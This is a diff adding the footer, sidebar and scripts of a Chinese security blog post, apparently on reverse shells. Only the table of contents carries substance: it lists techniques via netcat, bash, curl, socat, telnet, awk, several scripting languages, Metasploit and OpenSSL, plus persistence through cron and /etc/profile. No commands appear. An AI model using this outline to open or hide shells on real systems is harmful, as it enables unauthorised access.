+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/SelfEnglishWords">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="prev" title="Windows内网渗透之域渗透">
+      <i class="fa fa-chevron-left"></i> Windows内网渗透之域渗透
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">3.</span> <span class="nav-text">正向连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="nav-number">4.</span> <span class="nav-text">反向连接</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8netcat%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">5.</span> <span class="nav-text">利用netcat反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">6.</span> <span class="nav-text">利用bash反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Curl%E9%85%8D%E5%90%88bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">7.</span> <span class="nav-text">Curl配合bash反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">8.</span> <span class="nav-text">将反弹shell命令写入定时任务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%86%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5-x2F-etc-x2F-profile%E6%96%87%E4%BB%B6"><span class="nav-number">9.</span> <span class="nav-text">将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Socat%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">10.</span> <span class="nav-text">利用Socat反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Telnet%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">11.</span> <span class="nav-text">利用Telnet反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8awk%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">12.</span> <span class="nav-text">利用awk反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%84%E7%A7%8D%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.</span> <span class="nav-text">各种脚本反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#python%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.1.</span> <span class="nav-text">python脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.2.</span> <span class="nav-text">PHP脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.3.</span> <span class="nav-text">Perl脚本反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ruby%E8%84%9A%E6%9C%AC%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">13.4.</span> <span class="nav-text">Ruby脚本反弹shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell%E7%94%A8%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="nav-number">14.</span> <span class="nav-text">使用Metasploit生成反弹shell用的一句话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%90%8E%E8%8E%B7%E5%8F%96%E6%A8%A1%E6%8B%9F%E7%BB%88%E7%AB%AF"><span class="nav-number">15.</span> <span class="nav-text">反弹shell后获取模拟终端</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell"><span class="nav-number">16.</span> <span class="nav-text">使用OpenSSL反弹加密shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OpenSSL%E7%AE%80%E4%BB%8B"><span class="nav-number">16.1.</span> <span class="nav-text">OpenSSL简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8OpenSSL%E5%8F%8D%E5%BC%B9%E5%8A%A0%E5%AF%86shell-1"><span class="nav-number">16.2.</span> <span class="nav-text">使用OpenSSL反弹加密shell</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Bron"
+      src="/images/Elaina.png">
+  <p class="site-author-name" itemprop="name">Bron</p>
+  <div class="site-description" itemprop="description">原谅我这一生不羁放纵爱自由</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">55</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/truthnian" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;truthnian" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Elaina_Anime" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Elaina_Anime" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://youtube.com/2CTruth" title="YouTube → https:&#x2F;&#x2F;youtube.com&#x2F;2CTruth" rel="noopener" target="_blank"><i class="fab fa-youtube fa-fw"></i>YouTube</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://truthnian.github.io/" title="https:&#x2F;&#x2F;truthnian.github.io" rel="noopener" target="_blank">世界上最好的网站</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Thu Nov 03 2022 08:00:00 GMT+0800 (Singapore Standard Time) – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bron</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">407k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:10</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("11/3/2022 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已存活 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_lines.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+<script src="https://unpkg.com/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.3s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#FFFFE0',
+  buttonColorLight: '#00BFFF',
+  saveInCookies: true,
+  label: '🌓',
+  autoMatchOsTheme: true
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+</script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+    </div>
+</body>
+</html>
+
+
